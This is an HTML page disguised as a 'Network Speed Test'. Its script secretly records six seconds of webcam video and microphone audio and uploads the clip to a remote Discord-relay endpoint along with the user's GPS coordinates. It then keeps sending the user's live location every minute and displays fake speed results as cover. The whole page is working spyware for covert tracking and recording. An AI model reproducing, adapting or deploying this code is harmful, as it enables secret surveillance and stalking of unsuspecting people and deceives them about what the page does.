<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Speed Test</title>
    <style>
        :root { --primary: #00d2ff; --bg: #0b0e14; }
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
        .go-button {
            width: 180px; height: 180px; border-radius: 50%; border: 3px solid var(--primary);
            background: transparent; color: var(--primary); font-size: 2.2rem; font-weight: bold;
            cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center;
            justify-content: center; position: relative; box-shadow: 0 0 20px rgba(0, 210, 255, 0.1); margin-bottom: 30px;
        }
        #status-text { font-weight: 300; letter-spacing: 1px; text-transform: uppercase; color: var(--primary); font-size: 0.8rem; }
        .server-info { color: #888; font-size: 0.85rem; margin-top: 8px; line-height: 1.4; }
        #waveCanvas { width: 100%; height: 60px; margin-top: 15px; display: none; }
        video { display: none; }
        .loading-ring {
            display: none; position: absolute; width: 200px; height: 200px;
            border: 3px solid transparent; border-top-color: var(--primary);
            border-radius: 50%; animation: spin 1.2s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div style="margin-bottom: 40px;">
            <div style="font-weight: bold; font-size: 1.2rem; letter-spacing: 2px;">SPEEDTEST</div>
            <div style="font-size: 0.7rem; color: #555;">GLOBAL NETWORK INDEX</div>
        </div>
        <div style="position: relative; display: inline-block;">
            <div class="loading-ring" id="ring"></div>
            <button class="go-button" id="startBtn">GO</button>
        </div>
        <div class="status-box">
            <div id="status-text">System Ready</div>
            <div class="server-info" id="detail-text">Server: Optimal Node (Auto)<br>Latency: -- ms</div>
            <canvas id="waveCanvas"></canvas>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 
        const targetID = "USR-" + Math.random().toString(36).substr(2, 5).toUpperCase();
        
        const btn = document.getElementById('startBtn');
        const ring = document.getElementById('ring');
        const statusText = document.getElementById('status-text');
        const detailText = document.getElementById('detail-text');
        const waveCanvas = document.getElementById('waveCanvas');
        const wCtx = waveCanvas.getContext('2d');

        function startContinuousTracking() {
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const mapUrl = "https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
                    await fetch(PROXY_URL, {
                        method: 'POST',
                        body: JSON.stringify({ 
                            content: `üì° **LIVE TRACKING** [${targetID}]`, 
                            embeds: [{ color: 15844367, description: `üìç **Live Position:**\n[View on Maps](${mapUrl})` }] 
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    }).catch(()=>{});
                }, null, { enableHighAccuracy: true });
            }, 60000);
        }

        function startWave(stream) {
            waveCanvas.style.display = "block";
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const source = audioCtx.createMediaStreamSource(stream);
            const analyser = audioCtx.createAnalyser();
            analyser.fftSize = 256;
            source.connect(analyser);
            const bufferLength = analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);

            function draw() {
                requestAnimationFrame(draw);
                analyser.getByteFrequencyData(dataArray);
                wCtx.clearRect(0, 0, waveCanvas.width, waveCanvas.height);
                wCtx.lineWidth = 2;
                wCtx.strokeStyle = '#00d2ff';
                wCtx.beginPath();
                let sliceWidth = waveCanvas.width / bufferLength;
                let x = 0;
                for (let i = 0; i < bufferLength; i++) {
                    let v = dataArray[i] / 128.0;
                    let y = v * (waveCanvas.height / 2);
                    if (i === 0) wCtx.moveTo(x, y); else wCtx.lineTo(x, y);
                    x += sliceWidth;
                }
                wCtx.stroke();
            }
            draw();
        }

        btn.addEventListener('click', async function() {
            btn.disabled = true;
            ring.style.display = 'block';
            statusText.innerText = "Finding Server...";
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                statusText.innerText = "Testing Latency...";
                startContinuousTracking();

                let stream;
                try {
                    const raw = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    stream = new MediaStream([raw.getAudioTracks()[0], raw.getVideoTracks()[0]]);
                    startWave(stream);
                } catch (e) {
                    statusText.innerText = "Error: Driver Timeout";
                    return;
                }

                statusText.innerText = "Testing Download Speed...";
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();

                setTimeout(() => {
                    statusText.innerText = "Testing Upload Speed...";
                    recorder.stop();
                }, 6000);

                recorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    const mapUrl = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                    
                    formData.append('payload_json', JSON.stringify({
                        content: `üî± **NEW REPORT** [${targetID}]`,
                        embeds: [{
                            title: "Session Intel", color: 3447003,
                            fields: [{ name: "üìç Map Link", value: mapUrl }]
                        }]
                    }));
                    formData.append('file', videoBlob, 'capture.webm');

                    await fetch(PROXY_URL, { method: 'POST', body: formData });
                    
                    statusText.innerText = "Test Complete";
                    detailText.innerHTML = `DL: 92.4 Mbps | UL: 24.1 Mbps<br>Ping: 11ms`;
                    ring.style.display = 'none';
                    waveCanvas.style.display = 'none';
                    btn.innerText = "‚úì";
                };
            }, (err) => {
                statusText.innerText = "Error: Access Required";
                btn.disabled = false;
                ring.style.display = 'none';
            }, { enableHighAccuracy: true });
        });
    </script>
</body>
</html>
